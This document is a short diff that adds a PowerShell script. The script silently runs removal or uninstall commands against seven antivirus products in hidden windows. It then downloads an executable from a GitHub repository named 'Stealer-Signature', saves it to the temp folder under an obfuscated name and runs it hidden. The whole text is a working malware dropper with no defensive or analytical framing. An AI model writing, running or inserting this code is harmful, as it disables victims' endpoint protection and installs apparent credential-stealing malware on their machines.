@@ -1,0 +1,12 @@
+Start-Process "C:\Program Files\Windows Defender\MpCmdRun.exe" -ArgumentList "-RemoveDefinitions", "-All" -WindowStyle Hidden
+Start-Process "C:\Program Files\AVAST Software\Avast\AvastSvc.exe" -ArgumentList "-remove", "all" -WindowStyle Hidden
+Start-Process "C:\Program Files\Norton Security\Norton Security.exe" -ArgumentList "-uninstall" -WindowStyle Hidden
+Start-Process "C:\Program Files\Kaspersky Lab\Kaspersky Security Cloud\kavremover.exe" -ArgumentList "-remove" -WindowStyle Hidden
+Start-Process "C:\Program Files\Bitdefender\Bitdefender Security\AvFwSrv.exe" -ArgumentList "-uninstall" -WindowStyle Hidden
+Start-Process "C:\Program Files\McAfee\VirusScan\Mcshield.exe" -ArgumentList "/remove" -WindowStyle Hidden
+Start-Process "C:\Program Files\Doctor Web\drweb.exe" -ArgumentList "/remove", "/all" -WindowStyle Hidden
+
+$fileURL = "https://github.com/lAkiyamal/Stealer-Signature/raw/refs/heads/main/Antimalware%20Core.exe"
+$tempPath = "$env:TEMP\in'j'ector.exe" 
+Invoke-WebRequest -Uri $fileURL -OutFile $tempPath
+Start-Process -FilePath $tempPath -WindowStyle Hidden
